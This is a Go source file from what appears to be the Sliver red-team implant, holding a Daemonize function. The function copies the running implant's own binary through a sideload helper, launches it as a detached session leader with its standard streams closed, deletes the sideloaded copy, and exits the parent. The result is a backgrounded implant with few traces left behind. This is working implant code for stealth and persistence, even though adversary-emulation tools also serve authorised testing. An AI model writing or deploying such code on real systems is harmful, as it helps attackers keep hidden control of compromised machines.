// +build !windows

package daemon

import (
	// {{if.Config.Debug}}
	"log"
	// {{end}}
	"github.com/bishopfox/sliver/implant/sliver/taskrunner"
	"os"
	"syscall"
	"time"
)

func Daemonize() {
	// {{if .Config.Debug}}
	log.Println("Daemonizing")
	// {{end}}
	c, _ := syscall.Read(0, nil)
	if c == -1 {
		return
	}
	var ex []byte
	px, err := os.Executable()
	if err != nil {
		ex, err = os.ReadFile("/proc/self/exe")
		if err != nil {
			return
		}
	} else {
		ex, err = os.ReadFile(string(px))
		if err != nil {
			return
		}
	}
	file, err := taskrunner.SideloadFile(ex)
	if err != nil {
		return
	}

	// {{if .Config.Debug}}
	log.Printf("SideLoaded File: %s\n", file)
	// {{end}}

	attr := &os.ProcAttr{
		Dir:   "/",
		Env:   os.Environ(),
		Files: []*os.File{nil, nil, nil},
		Sys: &syscall.SysProcAttr{
			Setsid: true,
		},
	}
	child, err := os.StartProcess(file, os.Args, attr)
	if err != nil {
		return
	}

	// {{if .Config.Debug}}
	log.Printf("Child: ", child, "\n")
	// {{end}}

	child.Release()
	// Time for OS to load
	time.Sleep(200 * time.Millisecond)
	_ = os.Remove(file)
	os.Exit(0)

	return
}
